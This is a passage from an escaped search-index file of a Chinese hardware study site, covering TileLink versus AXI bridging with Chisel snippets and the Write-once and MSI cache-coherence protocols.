<p>\u200b\u672c\u6587\u200b\u4e3b\u8981\u200b\u8ba8\u8bba\u200b\u524d\u200b\u4e24\u79cd\u200b\uff0cTL-C \u200b\u7684\u200b\u5185\u5bb9\u200b\u5728\u200b \u200b\u4e00\u81f4\u6027\u200b\u534f\u8bae\u200b \u200b\u4e2d\u200b\u4ecb\u7ecd\u200b\u3002</p>"},{"location":"hardware/bus_protocol.html#_4","title":"\u63a5\u53e3","text":"<p>TileLink Uncached(TL-UL \u200b\u548c\u200b TL-UH) \u200b\u5305\u62ec\u200b\u4e86\u200b\u4e24\u4e2a\u200b channel\uff1a</p> <ul> <li>A channel: M-&gt;S \u200b\u53d1\u9001\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u7c7b\u6bd4\u200b AXI \u200b\u7684\u200b AR/AW/W</li> <li>D channel: S-&gt;M \u200b\u53d1\u9001\u200b\u54cd\u5e94\u200b\uff0c\u200b\u7c7b\u6bd4\u200b AXI \u200b\u7684\u200b R/B</li> </ul> <p>\u200b\u56e0\u6b64\u200b TileLink \u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u53ea\u80fd\u200b\u53d1\u9001\u200b\u8bfb\u200b\u6216\u8005\u200b\u5199\u200b\u7684\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u800c\u200b AXI \u200b\u53ef\u4ee5\u200b\u540c\u65f6\u200b\u5728\u200b AR \u200b\u548c\u200b AW channel \u200b\u4e0a\u200b\u53d1\u9001\u200b\u8bf7\u6c42\u200b\u3002</p> <p>\u200b\u4e00\u4e9b\u200b\u8bf7\u6c42\u200b\u7684\u200b\u4f8b\u5b50\u200b\uff1a</p> <ul> <li>\u200b\u8bfb\u200b\uff1aM-&gt;S \u200b\u5728\u200b A channel \u200b\u4e0a\u200b\u53d1\u9001\u200b Get\uff0cS-&gt;M \u200b\u5728\u200b D channel \u200b\u4e0a\u200b\u53d1\u9001\u200b AccessAckData</li> <li>\u200b\u5199\u200b\uff1aM-&gt;S \u200b\u5728\u200b A channel \u200b\u4e0a\u200b\u53d1\u9001\u200b PutFullData/PutPartialData\uff0cS-&gt;M \u200b\u5728\u200b D channel \u200b\u662f\u200b\u53d1\u9001\u200b AccessAck</li> <li>\u200b\u539f\u5b50\u200b\u64cd\u4f5c\u200b\uff1aM-&gt;S \u200b\u5728\u200b A channel \u200b\u4e0a\u200b\u53d1\u9001\u200b ArithmeticData/LogicalData\uff0cS-&gt;M \u200b\u5728\u200b D channel \u200b\u4e0a\u200b\u53d1\u9001\u200b AccessAckData</li> <li>\u200b\u9884\u53d6\u200b\u64cd\u4f5c\u200b\uff1aM-&gt;S \u200b\u5728\u200b A channel \u200b\u4e0a\u200b\u53d1\u9001\u200b Intent\uff0cS-&gt;M \u200b\u5728\u200b D channel \u200b\u4e0a\u200b\u53d1\u9001\u200b AccessAck</li> </ul>"},{"location":"hardware/bus_protocol.html#axi_1","title":"\u548c\u200b AXI \u200b\u7684\u200b\u5bf9\u6bd4","text":"<p>\u200b\u548c\u200b AXI \u200b\u5bf9\u6bd4\u200b\uff0cTileLink \u200b\u628a\u200b\u8bfb\u200b\u548c\u200b\u5199\u200b\u8fdb\u884c\u200b\u4e86\u200b\u5408\u5e76\u200b\uff0c\u200b\u6240\u6709\u200b\u7684\u200b\u8bfb\u5199\u200b\u8bf7\u6c42\u200b\u90fd\u200b\u901a\u8fc7\u200b A channel \u200b\u53d1\u9001\u200b\uff0c\u200b\u6240\u6709\u200b\u7684\u200b\u54cd\u5e94\u200b\u90fd\u200b\u901a\u8fc7\u200b D channel \u200b\u56de\u590d\u200b\u3002\u200b\u8fd9\u6837\u200b\u505a\u200b\u7b80\u5316\u200b\u4e86\u200b\u786c\u4ef6\u200b\u7684\u200b\u5b9e\u73b0\u200b\uff0c\u200b\u4f46\u200b\u5982\u679c\u200b CPU \u200b\u5e0c\u671b\u200b\u540c\u65f6\u200b\u8fdb\u884c\u200b\u5927\u91cf\u200b\u7684\u200b\u8bfb\u5199\u200b\uff0c\u200b\u53ef\u80fd\u200b AXI \u200b\u53ef\u4ee5\u200b\u5b9e\u73b0\u200b\u66f4\u200b\u9ad8\u200b\u7684\u200b\u6027\u80fd\u200b\u3002</p> <p>\u200b\u4e0b\u9762\u200b\u5206\u6790\u200b TileLink \u200b\u548c\u200b AXI \u200b\u534f\u8bae\u200b\u7684\u200b\u6865\u63a5\u200b\u6a21\u5757\u200b\u7684\u200b\u5b9e\u73b0\u200b\u65b9\u6cd5\u200b\u3002</p> <p>\u200b\u9996\u5148\u200b\u9488\u5bf9\u200b AXI4ToTL \u200b\u6a21\u5757\u200b\u7684\u200b\u4f8b\u5b50\u200b\uff0c\u200b\u6765\u200b\u5206\u6790\u200b\u4e00\u4e0b\u200b\u5982\u4f55\u200b\u628a\u200b\u4e00\u4e2a\u200b AXI4 Master \u200b\u8f6c\u6362\u200b\u4e3a\u200b TileLink\u3002</p> <p>\u200b\u9488\u5bf9\u200b AXI4 \u200b\u548c\u200b TileLink \u200b\u7684\u200b\u533a\u522b\u200b\u8fdb\u884c\u200b\u8bbe\u8ba1\u200b\uff1a\u200b\u4e00\u4e2a\u200b\u662f\u200b\u8bfb\u5199\u200b channel \u200b\u5408\u5e76\u200b\u4e86\u200b\uff0c\u200b\u6240\u4ee5\u200b\u8fd9\u91cc\u200b\u9700\u8981\u200b\u4e00\u4e2a\u200b Arbiter\uff1b\u200b\u5176\u6b21\u200b AXI4 \u200b\u4e2d\u200b AW \u200b\u548c\u200b W \u200b\u662f\u200b\u5206\u5f00\u200b\u7684\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u4e5f\u200b\u9700\u8981\u200b\u8fdb\u884c\u200b\u5408\u5e76\u200b\u3002\u200b\u8fd9\u4e2a\u200b\u6a21\u5757\u200b\u5e76\u200b\u4e0d\u200b\u8003\u8651\u200b Burst \u200b\u7684\u200b\u60c5\u51b5\u200b\uff0c\u200b\u800c\u662f\u200b\u7531\u200b AXI4Fragmenter \u200b\u6765\u200b\u8fdb\u884c\u200b\u62c6\u5206\u200b\uff0c\u200b\u5373\u200b\u6dfb\u52a0\u200b\u82e5\u5e72\u4e2a\u200b AW beat\uff0c\u200b\u548c\u200b W \u200b\u8fdb\u884c\u200b\u914d\u5bf9\u200b\u3002</p> <p>\u200b\u5177\u4f53\u200b\u5230\u200b\u4ee3\u7801\u200b\u5b9e\u73b0\u200b\u4e0a\u200b\uff0c\u200b\u9996\u5148\u200b\u628a\u200b AR channel \u200b\u5bf9\u5e94\u200b\u5230\u200b \u200b\u5230\u200b A channel \u200b\u4e0a\u200b\uff1a</p> <pre><code>val r_out = Wire(out.a)\nr_out.valid := in.ar.valid\nr_out.bits :&lt;= edgeOut.Get(r_id, r_addr, r_size)._2\n</code></pre> <p>\u200b\u7136\u540e\u200b AW+W channel \u200b\u4e5f\u200b\u8fde\u63a5\u200b \u200b\u5230\u200b A channel\uff0c\u200b\u7531\u4e8e\u200b\u4e0d\u7528\u200b\u8003\u8651\u200b burst \u200b\u7684\u200b\u60c5\u51b5\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u5728\u200b aw \u200b\u548c\u200b w \u200b\u540c\u65f6\u200b valid \u200b\u7684\u200b\u65f6\u5019\u200b\u624d\u200b\u8ba4\u4e3a\u200b\u6709\u200b\u8bf7\u6c42\u200b\u3002</p> <pre><code>val w_out = Wire(out.a)\nin.aw.ready := w_out.ready &amp;&amp; in.w.valid &amp;&amp; in.w.bits.last\nin.w.ready  := w_out.ready &amp;&amp; in.aw.valid\nw_out.valid := in.aw.valid &amp;&amp; in.w.valid\nw_out.bits :&lt;= edgeOut.Put(w_id, w_addr, w_size, in.w.bits.data, in.w.bits.strb)._2\n</code></pre> <p>\u200b\u4e3a\u4e86\u200b\u533a\u5206\u200b\u8bf7\u6c42\u200b\u7684\u200b\u7c7b\u578b\u200b\uff0c\u200b\u8bfb\u5199\u200b\u7684\u200b id \u200b\u589e\u52a0\u200b\u4e86\u200b\u82e5\u5e72\u4f4d\u200b\uff0c\u200b\u6700\u4f4e\u200b\u4f4d\u200b 0 \u200b\u8868\u793a\u200b\u8bfb\u200b\uff0c1 \u200b\u8868\u793a\u200b\u5199\u200b\uff0c\u200b\u5269\u4e0b\u200b\u51e0\u4f4d\u200b\u662f\u200b\u8bf7\u6c42\u200b\u7f16\u53f7\u200b\uff0c\u200b\u8fd9\u6837\u200b\u53d1\u51fa\u200b\u53bb\u200b\u7684\u200b\u662f\u200b\u4e0d\u540c\u200b id \u200b\u7684\u200b\u591a\u4e2a\u200b\u8bf7\u6c42\u200b\u3002</p> <p>\u200b\u7136\u540e\u200b\uff0c\u200b\u628a\u200b\u8bfb\u200b\u548c\u200b\u5199\u200b\u7684\u200b A channel \u200b\u8fde\u63a5\u200b\u5230\u200b Arbiter \u200b\u4e0a\u200b\uff1a</p> <pre><code>TLArbiter(TLArbiter.roundRobin)(out.a, (UInt(0), r_out), (in.aw.bits.len, w_out))\n</code></pre> <p>\u200b\u5176\u4f59\u200b\u7684\u200b\u90e8\u5206\u200b\u5219\u200b\u662f\u200b\u5bf9\u200b D channel \u200b\u8fdb\u884c\u200b\u5224\u65ad\u200b\uff0c\u200b\u6709\u200b\u6570\u636e\u200b\u7684\u200b\u8f6c\u7ed9\u200b R channel\uff0c\u200b\u6ca1\u6709\u200b\u6570\u636e\u200b\u7684\u200b\u8f6c\u7ed9\u200b B channel\uff1a</p> <pre><code>out.d.ready := Mux(d_hasData, ok_r.ready, ok_b.ready)\nok_r.valid := out.d.valid &amp;&amp; d_hasData\nok_b.valid := out.d.valid &amp;&amp; !d_hasData\n</code></pre> <p>\u200b\u6700\u540e\u200b\u5904\u7406\u200b\u4e86\u200b\u4e00\u4e0b\u200b TileLink \u200b\u548c\u200b AXI4 \u200b\u5bf9\u200b\u5199\u200b\u8bf7\u6c42\u200b\u8fd4\u56de\u200b\u786e\u8ba4\u200b\u7684\u200b\u533a\u522b\u200b\uff1aTileLink \u200b\u4e2d\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5728\u200b\u7b2c\u4e00\u4e2a\u200b burst beat \u200b\u5c31\u200b\u8fd4\u56de\u200b\u786e\u8ba4\u200b\uff0c\u200b\u800c\u200b AXI4 \u200b\u9700\u8981\u200b\u5728\u200b\u6700\u540e\u200b\u4e00\u4e2a\u200b burst beat \u200b\u4e4b\u540e\u200b\u8fd4\u56de\u200b\u786e\u8ba4\u200b\u3002</p> <p>\u200b\u518d\u200b\u6765\u770b\u200b\u4e00\u4e0b\u200b\u53cd\u8fc7\u6765\u200b\u7684\u200b\u8f6c\u6362\u200b\uff0c\u200b\u5373\u200b\u4ece\u200b TileLink Master \u200b\u5230\u200b AXI\u3002\u200b\u7531\u4e8e\u200b TileLink \u200b\u540c\u65f6\u200b\u53ea\u80fd\u200b\u8fdb\u884c\u200b\u8bfb\u200b\u6216\u8005\u200b\u5199\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5b83\u200b\u9996\u5148\u200b\u505a\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u865a\u6784\u200b\u7684\u200b arw channel\uff0c\u200b\u53ef\u4ee5\u200b\u7406\u89e3\u200b\u4e3a\u200b\u5408\u5e76\u200b\u4e86\u200b ar \u200b\u548c\u200b aw channel \u200b\u7684\u200b AXI4\uff0c\u200b\u8fd9\u4e2a\u200b\u8bbe\u8ba1\u200b\u5728\u200b SpinalHDL \u200b\u7684\u200b\u4ee3\u7801\u200b\u4e2d\u200b\u4e5f\u200b\u80fd\u200b\u770b\u5230\u200b\u3002\u200b\u7136\u540e\u200b\u518d\u200b\u6839\u636e\u200b\u662f\u5426\u662f\u200b\u5199\u5165\u200b\uff0c\u200b\u5206\u522b\u200b\u8fde\u63a5\u200b\u5230\u200b ar \u200b\u548c\u200b aw channel\uff1a</p> <pre><code>val queue_arw = Queue.irrevocable(out_arw, entries=depth, flow=combinational)\nout.ar.bits := queue_arw.bits\nout.aw.bits := queue_arw.bits\nout.ar.valid := queue_arw.valid &amp;&amp; !queue_arw.bits.wen\nout.aw.valid := queue_arw.valid &amp;&amp;  queue_arw.bits.wen\nqueue_arw.ready := Mux(queue_arw.bits.wen, out.aw.ready, out.ar.ready)\n</code></pre> <p>\u200b\u8fd9\u91cc\u200b\u5904\u7406\u200b\u4e86\u200b aw \u200b\u548c\u200b w \u200b\u7684\u200b valid \u200b\u4fe1\u53f7\u200b\uff1a</p> <pre><code>in.a.ready := !stall &amp;&amp; Mux(a_isPut, (doneAW || out_arw.ready) &amp;&amp; out_w.ready, out_arw.ready)\nout_arw.valid := !stall &amp;&amp; in.a.valid &amp;&amp; Mux(a_isPut, !doneAW &amp;&amp; out_w.ready, Bool(true))\nout_w.valid := !stall &amp;&amp; in.a.valid &amp;&amp; a_isPut &amp;&amp; (doneAW || out_arw.ready)\n</code></pre> <p>\u200b\u8fd9\u6837\u200b\u505a\u200b\u7684\u200b\u539f\u56e0\u200b\u662f\u200b\uff0c\u200b\u5728\u200b TileLink \u200b\u4e2d\u200b\uff0c\u200b\u6bcf\u4e2a\u200b burst \u200b\u90fd\u200b\u662f\u200b\u4e00\u4e2a\u200b a channel \u200b\u4e0a\u200b\u7684\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u800c\u200b AXI4 \u200b\u4e2d\u200b\uff0c\u200b\u53ea\u6709\u200b\u7b2c\u4e00\u4e2a\u200b burst \u200b\u6709\u200b aw \u200b\u8bf7\u6c42\u200b\uff0c\u200b\u6240\u6709\u200b burst \u200b\u90fd\u200b\u6709\u200b w \u200b\u8bf7\u6c42\u200b\uff0c\u200b\u56e0\u6b64\u200b\u8fd9\u91cc\u200b\u7528\u200b doneAW \u200b\u4fe1\u53f7\u200b\u6765\u200b\u8fdb\u884c\u200b\u533a\u5206\u200b\u3002</p> <p>\u200b\u63a5\u7740\u200b\uff0c\u200b\u8981\u200b\u628a\u200b b \u200b\u548c\u200b r channel \u200b\u4e0a\u200b\u7684\u200b\u7ed3\u679c\u200b\u8fde\u63a5\u200b\u5230\u200b d channel\uff0c\u200b\u6839\u636e\u200b\u4e0a\u9762\u200b\u7684\u200b\u7ecf\u9a8c\u200b\uff0c\u200b\u8fd9\u91cc\u200b \u200b\u53c8\u200b\u662f\u200b\u4e00\u4e2a\u200b arbitration\uff1a</p> <pre><code>val r_wins = (out.r.valid &amp;&amp; b_delay =/= UInt(7)) || r_holds_d\nout.r.ready := in.d.ready &amp;&amp; r_wins\nout.b.ready := in.d.ready &amp;&amp; !r_wins\nin.d.valid := Mux(r_wins, out.r.valid, out.b.valid)\n</code></pre> <p>\u200b\u6700\u540e\u200b\u8fd8\u200b\u5904\u7406\u200b\u4e86\u200b\u4e00\u4e0b\u200b\u8bf7\u6c42\u200b\u548c\u200b\u7ed3\u679c\u200b\u987a\u5e8f\u200b\u7684\u200b\u95ee\u9898\u200b\u3002</p>"},{"location":"hardware/cache_coherence_protocol.html","title":"\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u534f\u8bae","text":"<p>\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u534f\u8bae\u200b\u7684\u200b\u573a\u666f\u200b\u662f\u200b\uff0c\u200b\u591a\u6838\u200b CPU \u200b\u4e2d\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u6838\u5fc3\u200b\u90fd\u200b\u6709\u200b\u81ea\u5df1\u200b\u7684\u200b\u7f13\u5b58\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u4fdd\u8bc1\u200b\u8fd9\u4e9b\u200b\u7f13\u5b58\u200b\u7684\u200b\u6570\u636e\u200b\u4e00\u81f4\u200b\uff0c\u200b\u8bbe\u8ba1\u200b\u4e86\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u534f\u8bae\u200b\u3002</p>"},{"location":"hardware/cache_coherence_protocol.html#_2","title":"\u7406\u8bba\u200b\u5206\u6790","text":"<p>\u200b\u9996\u5148\u200b\u4ece\u200b\u7406\u8bba\u200b\u7684\u200b\u89d2\u5ea6\u200b\uff0c\u200b\u5206\u6790\u200b\u5982\u4f55\u200b\u8bbe\u8ba1\u200b\u4e00\u4e2a\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u534f\u8bae\u200b\u3002</p>"},{"location":"hardware/cache_coherence_protocol.html#write-invalidate-write-update","title":"Write-invalidate \u200b\u548c\u200b Write-update","text":"<p>\u200b\u6700\u200b\u57fa\u7840\u200b\u7684\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u601d\u60f3\u200b\u6709\u200b\u4e24\u79cd\u200b\uff1a</p> <ol> <li>Write-invalidate\uff1a\u200b\u5199\u5165\u200b\u6570\u636e\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5c06\u200b\u5176\u4ed6\u200b Cache \u200b\u4e2d\u200b\u8fd9\u6761\u200b Cache Line \u200b\u8bbe\u200b\u4e3a\u200b Invalid</li> <li>Write-update\uff1a\u200b\u5199\u5165\u200b\u6570\u636e\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u628a\u200b\u65b0\u200b\u7684\u200b\u7ed3\u679c\u200b\u5199\u5165\u200b\u5230\u200b\u6709\u200b\u8fd9\u6761\u200b Cache Line \u200b\u7684\u200b\u5176\u4ed6\u200b Cache</li> </ol>"},{"location":"hardware/cache_coherence_protocol.html#write-once","title":"Write-once \u200b\u534f\u8bae","text":"<p>Write-once \u200b\u534f\u8bae\u200b\u5b9a\u4e49\u200b\u4e86\u200b\u56db\u4e2a\u200b\u72b6\u6001\u200b\uff1a</p> <ol> <li>Invalid\uff1a\u200b\u8868\u793a\u200b\u8fd9\u4e2a\u200b\u5757\u200b\u4e0d\u200b\u5408\u6cd5\u200b</li> <li>Valid\uff1a\u200b\u8868\u793a\u200b\u8fd9\u4e2a\u200b\u5757\u200b\u5408\u6cd5\u200b\uff0c\u200b\u5e76\u200b\u53ef\u80fd\u200b\u662f\u200b\u5171\u4eab\u200b\u7684\u200b\uff0c\u200b\u540c\u65f6\u200b\u6570\u636e\u200b\u6ca1\u6709\u200b\u4fee\u6539\u200b</li> <li>Reserved\uff1a\u200b\u8868\u793a\u200b\u8fd9\u4e2a\u200b\u5757\u200b\u5408\u6cd5\u200b\uff0c\u200b\u4e0d\u662f\u200b\u5171\u4eab\u200b\u7684\u200b\uff0c\u200b\u540c\u65f6\u200b\u6570\u636e\u200b\u6ca1\u6709\u200b\u66f4\u6539\u200b</li> <li>Dirty\uff1a\u200b\u8868\u793a\u200b\u8fd9\u4e2a\u200b\u5757\u200b\u5408\u6cd5\u200b\uff0c\u200b\u4e0d\u662f\u200b\u5171\u4eab\u200b\u7684\u200b\uff0c\u200b\u6570\u636e\u200b\u505a\u200b\u4e86\u200b\u4fee\u6539\u200b\uff0c\u200b\u548c\u200b\u5185\u5b58\u200b\u4e0d\u540c\u200b\u3002</li> </ol> <p>\u200b\u53ef\u89c1\u200b\uff0c\u200b\u5f53\u200b\u4e00\u4e2a\u200b\u7f13\u5b58\u200b\u72b6\u6001\u200b\u5728\u200b R \u200b\u6216\u8005\u200b D\uff0c\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u53ea\u80fd\u200b\u662f\u200b I\uff1b\u200b\u800c\u200b\u7f13\u5b58\u200b\u72b6\u6001\u200b\u662f\u200b V \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u6709\u200b\u591a\u4e2a\u200b\u7f13\u5b58\u200b\u5728\u200b V \u200b\u72b6\u6001\u200b\u3002</p> <p>Write-once \u200b\u534f\u8bae\u200b\u7684\u200b\u7279\u70b9\u200b\u662f\u200b\uff0c\u200b\u7b2c\u4e00\u6b21\u200b\u5199\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f1a\u200b\u5199\u5165\u200b\u5230\u200b\u5185\u5b58\u200b\uff08\u200b\u7c7b\u4f3c\u200b Write-through\uff09\uff0c\u200b\u8fde\u7eed\u200b\u5199\u5165\u200b\u5219\u200b\u53ea\u200b\u5199\u200b\u5230\u200b\u7f13\u5b58\u200b\u4e2d\u200b\uff0c\u200b\u7c7b\u4f3c\u200b Write-back\u3002</p> <p>\u200b\u5f53\u200b Read hit \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u72b6\u6001\u200b\u4e0d\u53d8\u200b\u3002</p> <pre><code>Read hit: The information is supplied by the current cache. No state\nchange.\n</code></pre> <p>\u200b\u5f53\u200b Read miss \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f1a\u200b\u67e5\u770b\u200b\u6240\u6709\u200b\u7f13\u5b58\u200b\uff0c\u200b\u5982\u679c\u200b\u6709\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u5904\u4e8e\u200b Valid/Reserved/Dirty \u200b\u72b6\u6001\u200b\uff0c\u200b\u5c31\u200b\u4ece\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u5904\u200b\u8bfb\u53d6\u6570\u636e\u200b\uff0c\u200b\u7136\u540e\u200b\u8bbe\u200b\u4e3a\u200b Valid\uff0c\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u4e5f\u200b\u8bbe\u4e3a\u200b Valid\u3002\u200b\u5982\u679c\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u5904\u4e8e\u200b Dirty \u200b\u72b6\u6001\u200b\uff0c\u200b\u8fd8\u8981\u200b\u628a\u200b\u6570\u636e\u200b\u5199\u5165\u200b\u5185\u5b58\u200b\u3002</p> <pre><code>Read miss: The data is read from main memory. The read is snooped by\nother caches; if any of them have the line in the Dirty state, the read\nis interrupted long enough to write the data back to memory before it is\nallowed to continue. Any copies in the Dirty or Reserved states are set\nto the Valid state.\n</code></pre> <p>\u200b\u5f53\u200b Write hit \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5982\u679c\u200b\u662f\u200b Valid \u200b\u72b6\u6001\u200b\uff0c\u200b\u9996\u5148\u200b\u5199\u5165\u200b\u5185\u5b58\u200b\uff0c\u200b\u628a\u200b\u5176\u4ed6\u200b Cache \u200b\u90fd\u200b\u8bbe\u4e3a\u200b Invalid\uff0c\u200b\u8fdb\u5165\u200b Reserved \u200b\u72b6\u6001\u200b\uff0c\u200b\u8fd9\u200b\u610f\u5473\u7740\u200b\u7b2c\u4e00\u6b21\u200b\u5199\u200b\u662f\u200b Write-through\u3002\u200b\u5982\u679c\u200b\u662f\u200b Reserved/Dirty \u200b\u72b6\u6001\u200b\uff0c\u200b\u5219\u200b\u4e0d\u200b\u4fee\u6539\u200b\u5185\u5b58\u200b\uff0c\u200b\u8fdb\u5165\u200b Dirty \u200b\u72b6\u6001\u200b\uff0c\u200b\u8fd9\u200b\u8868\u793a\u200b\u540e\u7eed\u200b\u7684\u200b\u5199\u5165\u200b\u90fd\u200b\u662f\u200b Write-back\u3002</p> <pre><code>Write hit: If the information in the cache is in Dirty or Reserved\nstate, the cache line is updated in place and its state is set to Dirty\nwithout updating memory. If the information is in Valid state, a\nwrite-through operation is executed updating the block and the memory\nand the block state is changed to Reserved. Other caches snoop the write\nand set their copies to Invalid.\n</code></pre> <p>\u200b\u5f53\u200b Write miss \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u884c\u4e3a\u200b Wikipedia \u200b\u4e0a\u200b\u548c\u200b\u4e0a\u8bfe\u200b\u8bb2\u200b\u7684\u200b\u4e0d\u200b\u4e00\u6837\u200b\u3002\u200b\u6309\u7167\u200b Wikipedia \u200b\u7684\u200b\u8bf4\u6cd5\u200b\uff0c\u200b\u9996\u5148\u200b\u6309\u7167\u200b Read miss \u200b\u5904\u7406\u200b\uff0c\u200b\u518d\u200b\u6309\u7167\u200b Write hit \u200b\u5904\u7406\u200b\uff0c\u200b\u7c7b\u4f3c\u200b\u4e8e\u200b Write Allocate \u200b\u7684\u200b\u601d\u8def\u200b\u3002\u200b\u5982\u679c\u200b\u662f\u200b\u8fd9\u6837\u7684\u8bdd\u200b\uff0c\u200b\u90a3\u4e48\u200b\u9996\u5148\u200b\u4ece\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u6216\u8005\u200b\u5185\u5b58\u200b\u8bfb\u53d6\u6570\u636e\u200b\uff0c\u200b\u7136\u540e\u200b\u628a\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u90fd\u200b\u8bbe\u4e3a\u200b Invalid\uff0c\u200b\u628a\u200b\u66f4\u65b0\u200b\u540e\u200b\u7684\u200b\u6570\u636e\u200b\u5199\u5165\u200b\u5185\u5b58\u200b\uff0c\u200b\u8fdb\u5165\u200b Reserved \u200b\u72b6\u6001\u200b\u3002\u200b\u76f8\u5f53\u4e8e\u200b Write miss \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4e5f\u200b\u662f\u200b\u6309\u7167\u200b Write-through \u200b\u5b9e\u73b0\u200b\u3002</p> <pre><code>Write miss: A partial cache line write is handled as a read miss (if\nnecessary to fetch the unwritten portion of the cache line) followed by\na write hit. This leaves all other caches in the Invalid state, and the\ncurrent cache in the Reserved state.\n</code></pre> <p>\u200b\u6559\u6750\u200b\u4e0a\u200b\u5219\u200b\u662f\u200b Write miss \u200b\u7684\u200b\u65f6\u5019\u200b\u6309\u7167\u200b Write-back \u200b\u5904\u7406\u200b\u3002\u200b\u5982\u679c\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u90fd\u200b\u662f\u200b Invalid \u200b\u65f6\u200b\uff0c\u200b\u4ece\u200b\u5185\u5b58\u200b\u91cc\u200b\u8bfb\u53d6\u6570\u636e\u200b\uff0c\u200b\u7136\u540e\u200b\u5199\u5165\u200b\u5230\u200b\u7f13\u5b58\u200b\u4e2d\u200b\uff0c\u200b\u8fdb\u5165\u200b Dirty \u200b\u72b6\u6001\u200b\u3002\u200b\u5982\u679c\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u662f\u200b Valid/Reserved/Dirty \u200b\u72b6\u6001\u200b\uff0c\u200b\u5c31\u200b\u4ece\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u91cc\u200b\u8bfb\u53d6\u6570\u636e\u200b\uff0c\u200b\u8ba9\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u90fd\u200b\u8fdb\u5165\u200b Invalid \u200b\u72b6\u6001\u200b\uff0c\u200b\u7136\u540e\u200b\u66f4\u65b0\u200b\u81ea\u5df1\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u8fdb\u5165\u200b Dirty \u200b\u72b6\u6001\u200b\u3002</p>"},{"location":"hardware/cache_coherence_protocol.html#msi","title":"MSI \u200b\u534f\u8bae","text":"<p>MSI \u200b\u534f\u8bae\u200b\u6bd4\u8f83\u7b80\u5355\u200b\uff0c\u200b\u5b83\u200b\u5b9a\u4e49\u200b\u4e86\u200b\u4e09\u4e2a\u200b\u72b6\u6001\u200b\uff1a</p> <ol> <li>Modified\uff1a\u200b\u8868\u793a\u200b\u6570\u636e\u200b\u5df2\u7ecf\u200b\u4fee\u6539\u200b\uff0c\u200b\u548c\u200b\u5185\u5b58\u200b\u91cc\u200b\u4e0d\u200b\u4e00\u81f4\u200b</li> <li>Shared\uff1a\u200b\u6570\u636e\u200b\u548c\u200b\u5185\u5b58\u200b\u4e00\u81f4\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u6709\u200b\u4e00\u5230\u200b\u591a\u4e2a\u200b\u7f13\u5b58\u200b\u540c\u65f6\u200b\u5904\u5728\u200b Shared \u200b\u72b6\u6001\u200b</li> <li>Invalid\uff1a\u200b\u4e0d\u200b\u5728\u200b\u7f13\u5b58\u200b\u4e2d\u200b</li> </ol> <p>\u200b\u5f53\u200b Read hit \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u72b6\u6001\u200b\u4e0d\u53d8\u200b\u3002</p> <p>\u200b\u5f53\u200b Read miss \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u68c0\u67e5\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u7684\u200b\u72b6\u6001\u200b\uff0c\u200b\u5982\u679c\u200b\u90fd\u200b\u662f\u200b Invalid\uff0c\u200b\u5c31\u200b\u4ece\u200b\u5185\u5b58\u200b\u91cc\u200b\u8bfb\u53d6\u200b\uff0c\u200b\u7136\u540e\u200b\u8fdb\u5165\u200b Shared \u200b\u72b6\u6001\u200b\u3002\u200b\u5982\u679c\u200b\u6709\u200b Shared\uff0c\u200b\u5c31\u200b\u4ece\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u5904\u200b\u8bfb\u53d6\u200b\u3002\u200b\u5982\u679c\u200b\u6709\u200b Dirty\uff0c\u200b\u90a3\u200b\u5c31\u8981\u200b\u628a\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u7684\u200b\u6570\u636e\u200b\u5199\u5165\u200b\u5185\u5b58\u200b\u548c\u200b\u672c\u5730\u200b\u7f13\u5b58\u200b\uff0c\u200b\u7136\u540e\u200b\u8fdb\u5165\u200b Shared \u200b\u72b6\u6001\u200b\u3002</p> <p>\u200b\u5f53\u200b Write hit \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5982\u679c\u200b\u73b0\u5728\u200b\u662f\u200b Shared \u200b\u72b6\u6001\u200b\uff0c\u200b\u5219\u200b\u8981\u200b\u8ba9\u200b\u5176\u4ed6\u200b\u7684\u200b Shared \u200b\u7f13\u5b58\u200b\u8fdb\u5165\u200b Invalid 